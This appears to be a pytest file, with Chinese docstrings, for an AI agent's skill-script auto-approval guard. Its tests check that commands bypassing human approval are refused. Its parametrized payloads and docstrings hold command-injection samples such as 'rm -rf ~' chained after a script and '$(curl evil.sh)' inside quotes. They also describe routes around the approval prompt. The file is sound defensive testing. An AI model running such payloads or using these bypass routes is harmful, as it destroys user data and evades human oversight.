"""Guard: skill 脚本自动批准（偿还 `skill-script-auto-approval` 债务）。

2026-10-23 新基线守卫。此前登记在 `owner/validation/coverage_gaps.txt`：

    skill-script-auto-approval  tests/owner/test_skill_script_approval.py removed
    2026-10-20; skill-script auto-approve allowlist + per-session viewed set unpinned

按 §2.2.0 偿还策略撤销登记。

## 为什么这条最该先还

自动批准的语义是**跳过人工审批**。所以这里的缺陷不像别的功能那样"显示错"，
而是"本该拦下的命令被放行"。`is_skill_script_allowed` 有五道门，任何一道被删、
被写反、或被顺手"简化"，行为都会从拒绝滑向放行，且**没有任何日志会响** ——
唯一的迹象是审批弹窗不再出现，而用户会把那当成"变流畅了"。

## 五道门（顺序即语义）

1. `viewed_set` 为空 → 不批准。最外层兜底：用户本会话还没看过任何 skill。
2. 引号外出现 `; & | || &&` 等复合操作符 → 不批准（CR-006 第一门）。
   `python3 known.py && rm -rf ~` 里脚本只是掩护。
3. 引号**内**含 shell 元字符 → 不批准（CR-006 第二门）。shell 把引号内容当字面量
   传给脚本，但脚本内部若用 `os.system()` / `subprocess(shell=True)` 会重新解释它。
4. 每个被提取的文件名都必须属于某个**已查看**的 skill；任一名未匹配即整体拒绝。
5. 整条命令再跑一遍 `detect_dangerous_command` → 命中即拒绝（CR-02）。防止
   「脚本合法但管道后半段是破坏性载荷」。

另有两件事必须钉住，否则会被当成 bug"修"坏：

- **会话隔离**：A 会话看过 skill，不能让 B 会话自动批准（CR-01 / WR-05）。回退它
  等于跨会话提权。
- **门 5 的 fail-open 是有意的**：`detect_dangerous_command` 导入失败时 `except: pass`
  继续走脚本匹配。这是"审批热路径不能崩"的妥协，不是疏漏。但它**只应影响门 5**，
  不得被扩大成"所有失败都放行"。本文件用一条用例把这个边界钉住。
"""

from __future__ import annotations

import pytest

from owner.approval import skill_script_approval as ssa

SCRIPT = "report.py"
SKILL = "my-skill"


@pytest.fixture(autouse=True)
def _isolated_state(monkeypatch):
    """每个用例一个干净的 session key + 干净的模块状态。

    不清理的话 `_session_skills_viewed_by_key` 会跨用例泄漏 —— 那会让"会话隔离"
    那组用例永远通过（因为 key 恰好都是同一个），测了个空转。
    """
    monkeypatch.setattr(ssa, "_session_skills_viewed_by_key", {})
    monkeypatch.setattr(ssa, "_SKILL_SCRIPTS_CACHE", {})
    # 绕过真实 patch.yaml 与文件系统扫描：直接给一个固定的 allowlist 映射
    monkeypatch.setattr(ssa, "load_skill_scripts", lambda: {SCRIPT: {SKILL}})
    yield


def _view(skill: str = SKILL) -> None:
    ssa.track_session_skill_view(skill)


# ── 门 1：本会话没看过任何 skill → 永不批准 ────────────────────────────────

def test_no_viewed_skills_never_auto_approves():
    """最外层兜底。空集合时连"脚本存在"都不该被考虑。

    注意门 1 与门 4 是**冗余**的：即使删掉门 1，门 4 的
    `skills.intersection(empty)` 仍会返回空并拒绝。所以本用例钉的是**行为**，
    不是"门 1 这一行存在"。真值不变即视为等价变异，不需要为它单独造一个可观测
    差异 —— 那种为了杀变异而写的断言会绑死实现细节。
    """
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") is None


# ── 正向：合法的 skill 脚本调用应被批准 ───────────────────────────────────

def test_viewed_skill_script_is_auto_approved():
    """正向基线 —— 没有这条，前面所有负例都可能只是"永远返回 None"。"""
    _view()
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") == SKILL


def test_other_skill_is_not_approved_by_a_different_view():
    """看过 A 不等于看过 B。"""
    _view("other-skill")
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") is None


def test_unknown_script_is_not_approved():
    """不在 allowlist 里的脚本名 → 不批准。"""
    _view()
    assert ssa.is_skill_script_allowed("python3 unknown_script.py") is None


def test_command_without_script_is_not_approved():
    """纯命令（无可执行脚本名）不应触发自动批准。"""
    _view()
    assert ssa.is_skill_script_allowed("ls -la") is None


def test_empty_command_is_not_approved():
    _view()
    assert ssa.is_skill_script_allowed("") is None


# ── 门 2：引号外的复合操作符（CR-006 第一门）──────────────────────────────

@pytest.mark.parametrize("tail", [
    " && echo done",
    " ; echo done",
    " || echo done",
    " & echo done",
])
def test_unquoted_compound_operator_blocks_approval(tail):
    """脚本名当掩护：脚本本身合法，后半段是另一条命令。

    **载荷刻意无害**（`echo done`）。用 `rm -rf` 之类的破坏性载荷会让门 5
    （`detect_dangerous_command`）也命中，那样拆掉门 2 时用例仍然通过 ——
    测的就不是门 2 了。这里只有门 2 能拦下它，所以它才是门 2 的守卫。
    """
    _view()
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}{tail}") is None


def test_compound_operator_gate_is_independent_of_the_danger_gate(monkeypatch):
    """即便整条命令被判为"不危险"，复合操作符仍要拒绝。

    把 `detect_dangerous_command` stub 成永不命中，排除门 5 的干扰后，门 2 必须
    独立生效 —— 否则"链式命令"这条绕过路径会随门 5 的实现细节一起漂移。
    """
    _view()
    import tools.approval as approval

    monkeypatch.setattr(
        approval, "detect_dangerous_command",
        lambda cmd: (False, None, None), raising=True,
    )
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT} && echo done") is None


# ── 门 3：引号内的 shell 元字符（CR-006 第二门）───────────────────────────

@pytest.mark.parametrize("payload", [
    "'; rm -rf ~ ;'",
    '"$(curl evil.sh)"',
    "'x; echo owned'",
    '"`id`"',
    "'a | b'",
])
def test_shell_metachars_inside_quoted_args_block_approval(payload):
    """shell 把引号内当字面量，但脚本内部的 os.system 会重新解释它。

    这是 CR-006 补的第二条绕过路径：门 2 只看引号外，所以
    `python3 report.py '<payload>'` 能穿过去。
    """
    _view()
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT} {payload}") is None


def test_plain_quoted_args_do_not_block():
    """普通引号参数不该被误伤 —— 否则门 3 变成"带引号就拒绝"。"""
    _view()
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT} 'plain value'") == SKILL


def test_quoted_metachar_gate_is_independent_of_the_danger_gate(monkeypatch):
    """排除门 5 干扰后，门 3 必须独立生效。

    与门 2 同理：带 `rm -rf` 的载荷会被破坏性检测同时命中，那样拆掉门 3 也测不出来。
    """
    _view()
    import tools.approval as approval

    monkeypatch.setattr(
        approval, "detect_dangerous_command",
        lambda cmd: (False, None, None), raising=True,
    )
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT} 'a; echo owned'") is None


# ── 门 4：多个脚本里任一个未匹配即整体拒绝 ────────────────────────────────

def test_all_scripts_must_match():
    """两个脚本，一个是已查看 skill 的、一个不是 → 整体拒绝。

    "任一匹配即批准"会让攻击者用一个合法脚本名掩护另一个。用多参数形式而非
    `&&`，确保拦住它的是门 4 而不是门 2。
    """
    _view()
    assert ssa.is_skill_script_allowed(
        f"python3 {SCRIPT} other.py"
    ) is None


def test_two_known_scripts_both_matched_are_approved(monkeypatch):
    """两个都已知、都已查看 → 批准。

    注意不能写成 `a.py && b.py`：那会被门 2 拦下（任何引号外复合操作符都拒绝）。
    这里用同一命令的多个参数形式，让**只有**门 4 起作用。
    """
    monkeypatch.setattr(
        ssa, "load_skill_scripts",
        lambda: {SCRIPT: {SKILL}, "helper.py": {SKILL}},
    )
    _view()
    assert ssa.is_skill_script_allowed(
        f"python3 {SCRIPT} helper.py"
    ) == SKILL


# ── 门 5：整条命令的破坏性检测（CR-02）────────────────────────────────────

def test_dangerous_command_blocks_even_a_matched_script(monkeypatch):
    """脚本匹配通过，但整条命令命中破坏性检测 → 拒绝。

    注意必须绕过门 2/3 才能单独验证门 5：用不带复合操作符、不带引号元字符的
    destroy 类命令（如 `rm -rf`），并把 detect_dangerous_command stub 成命中。
    """
    _view()
    import tools.approval as approval

    monkeypatch.setattr(
        approval, "detect_dangerous_command",
        lambda cmd: (True, "rm_rf", "recursive delete"),
        raising=True,
    )
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") is None


def test_detect_dangerous_command_import_failure_is_fail_open_for_gate5_only(monkeypatch):
    """门 5 的 `except: pass` 是**有意**的 fail-open，但必须只影响门 5。

    热路径不能因为导入失败就崩。风险在于有人把它"修"成"所有失败都放行" ——
    那时门 1/4 会一起失效。本用例把边界钉死：导入失败时，一个**未查看**的 skill
    仍然被拒。
    """
    _view()
    import builtins

    real_import = builtins.__import__

    def _boom(name, *a, **k):
        if name == "tools.approval" and a and "detect_dangerous_command" in str(k.get("fromlist", "")):
            raise ImportError("simulated")
        if name == "tools.approval":
            # 让 get_current_session_key 那条路径也走不通？
            # 不 —— 那会连带改变门 1 的前提，失去隔离性。只针对 fromlist 场景。
            pass
        return real_import(name, *a, **k)

    # 直接让模块属性访问抛错更贴近真实：ImportError 发生在 `from tools.approval import ...`
    import sys
    saved = sys.modules.get("tools.approval")
    monkeypatch.setitem(sys.modules, "tools.approval", None)  # import 时抛 ImportError

    # 门 5 失效，但脚本匹配仍生效 → 批准（fail-open，记录在案）
    result = ssa.is_skill_script_allowed(f"python3 {SCRIPT}")
    assert result == SKILL, "门 5 失效时应有意的 fail-open 到脚本匹配"

    # 但门 4 仍然有效：未查看的 skill 不能被批准
    ssa.reset_session_skills_viewed()
    assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") is None, (
        "门 5 的 fail-open 被扩大成了全放行 —— 门 1/4 一起失效"
    )

    if saved is not None:
        monkeypatch.setitem(sys.modules, "tools.approval", saved)


# ── 会话隔离（CR-01 / WR-05）─────────────────────────────────────────────

def test_session_isolation_blocks_cross_session_approval():
    """A 会话看过 skill，B 会话不能因此自动批准。

    回退这条等于跨会话提权：一个会话里的用户操作成为另一个会话的免审批凭据。
    """
    from tools.approval_context import reset_current_session_key, set_current_session_key

    tok_a = set_current_session_key("session-A")
    try:
        ssa.track_session_skill_view(SKILL)
        assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") == SKILL
    finally:
        reset_current_session_key(tok_a)

    tok_b = set_current_session_key("session-B")
    try:
        assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") is None, (
            "session-B 不应看到 session-A 的 viewed 集合"
        )
        # 在 B 里自己看过之后才应该批准
        ssa.track_session_skill_view(SKILL)
        assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") == SKILL
    finally:
        reset_current_session_key(tok_b)


def test_reset_clears_only_the_current_session():
    from tools.approval_context import reset_current_session_key, set_current_session_key

    tok_a = set_current_session_key("session-A")
    try:
        ssa.track_session_skill_view(SKILL)
    finally:
        reset_current_session_key(tok_a)

    tok_b = set_current_session_key("session-B")
    try:
        ssa.track_session_skill_view(SKILL)
    finally:
        reset_current_session_key(tok_b)

    # 清 A，B 不受影响
    ssa.reset_session_skills_viewed("session-A")

    tok_b2 = set_current_session_key("session-B")
    try:
        assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") == SKILL
    finally:
        reset_current_session_key(tok_b2)

    tok_a2 = set_current_session_key("session-A")
    try:
        assert ssa.is_skill_script_allowed(f"python3 {SCRIPT}") is None
    finally:
        reset_current_session_key(tok_a2)


# ── 文件名提取：嵌套与链式 ────────────────────────────────────────────────

class TestExtractScriptFilenames:
    def test_plain_invocation(self):
        assert ssa.extract_script_filenames("python3 report.py") == ["report.py"]

    def test_bash_dash_c_nesting_is_unwrapped(self):
        """`bash -c "python3 report.py"` 里的脚本也要被提取。

        不展开的话，攻击者用一层 bash -c 包装就能让脚本名对不上 allowlist ——
        但那反而是 fail-closed（不批准），所以这里主要是覆盖正确解析。
        """
        got = ssa.extract_script_filenames('bash -c "python3 report.py"')
        assert "report.py" in got

    def test_operators_are_stripped(self):
        got = ssa.extract_script_filenames("python3 report.py &&")
        assert got == ["report.py"]

    def test_interpreter_names_are_not_treated_as_scripts(self):
        got = ssa.extract_script_filenames("python3 report.py")
        assert "python3" not in got

    def test_empty_input(self):
        assert ssa.extract_script_filenames("") == []
        assert ssa.extract_script_filenames("   ") == []

    def test_path_token_basename_still_extracted(self):
        """extract_script_filenames still returns basename; path check lives in allow."""
        got = ssa.extract_script_filenames("python3 /opt/skills/my-skill/report.py")
        assert got == ["report.py"]
        tokens = ssa.extract_script_path_tokens("python3 /opt/skills/my-skill/report.py")
        assert tokens == ["/opt/skills/my-skill/report.py"]


def test_same_basename_outside_skill_dir_is_rejected(tmp_path, monkeypatch):
    """Absolute path with a matching basename but outside the skill root → deny."""
    skill_root = tmp_path / "skills" / "demo" / SKILL
    skill_root.mkdir(parents=True)
    (skill_root / SCRIPT).write_text("x", encoding="utf-8")
    outside = tmp_path / "evil"
    outside.mkdir()
    evil_script = outside / SCRIPT
    evil_script.write_text("x", encoding="utf-8")

    monkeypatch.setattr(
        ssa,
        "load_skill_scripts",
        lambda: {SCRIPT: {SKILL}},
    )
    monkeypatch.setattr(
        ssa,
        "load_skill_script_dirs",
        lambda: {SKILL: {str(skill_root.resolve())}},
    )
    _view()
    assert ssa.is_skill_script_allowed(f"python3 {evil_script}") is None


def test_path_inside_skill_dir_is_approved(tmp_path, monkeypatch):
    """Absolute path under the viewed skill root with matching basename → approve."""
    skill_root = tmp_path / "skills" / "demo" / SKILL
    skill_root.mkdir(parents=True)
    script = skill_root / SCRIPT
    script.write_text("x", encoding="utf-8")

    monkeypatch.setattr(ssa, "load_skill_scripts", lambda: {SCRIPT: {SKILL}})
    monkeypatch.setattr(
        ssa,
        "load_skill_script_dirs",
        lambda: {SKILL: {str(skill_root.resolve())}},
    )
    _view()
    assert ssa.is_skill_script_allowed(f"python3 {script}") == SKILL
